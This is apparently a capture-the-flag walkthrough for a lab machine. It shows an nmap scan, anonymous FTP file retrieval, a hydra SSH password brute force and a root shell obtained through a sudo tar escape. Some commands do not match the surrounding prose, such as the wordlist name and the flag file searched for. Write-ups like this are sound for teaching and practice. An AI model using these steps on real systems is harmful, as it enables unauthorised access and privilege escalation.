# Description

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

# Steps
1 - Join the room, start the virtual machine and the AttackBox (or connect via VPN)

2 - Find open ports on the machine
* ```# nmap <ip-virtual-machine>```



* After nmap is finished scanning, our output shows three open ports:
```
21 | ftp
22 | ssh
80 | http
```

3 - Who wrote the task list?
* Access the ftp of the virtual machine with ```anonymous``` user
* ```# ftp <ip-virtual-machine>```
* List and download all the files in the ftp server
* ```ftp> dir```
* ```ftp> get locks.txt```
* ```ftp> get task.txt```
* View the content of tast.txt
* ```# cat task.txt```

4 - What service can you bruteforce with the text file found?
* Check the result of the nmap scan

5 - What is the users password? 
* Use hydra with the locks.txt file to bruteforce the ssh user and pasword
* ```# hydra -l lin -P /root/task.txt <ip-virtual-machine> ssh```

6 - user.txt
* With the result of hydra login in to the virtual machine via ssh and get the flag of the ```user.txt```

7 - root.txt
* Run ```# sudo -l``` to list the commands that the ```lin``` user can run as sudo, you can see that ```/bin/tar``` is the only one
* Go to [GTFOBins](https://gtfobins.github.io/) and search for ```tar``` bypass command and execute it:
* ```# sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
* Search the root.txt file
* ```# find / -name flag.txt 2>/dev/null```
* Get the flag
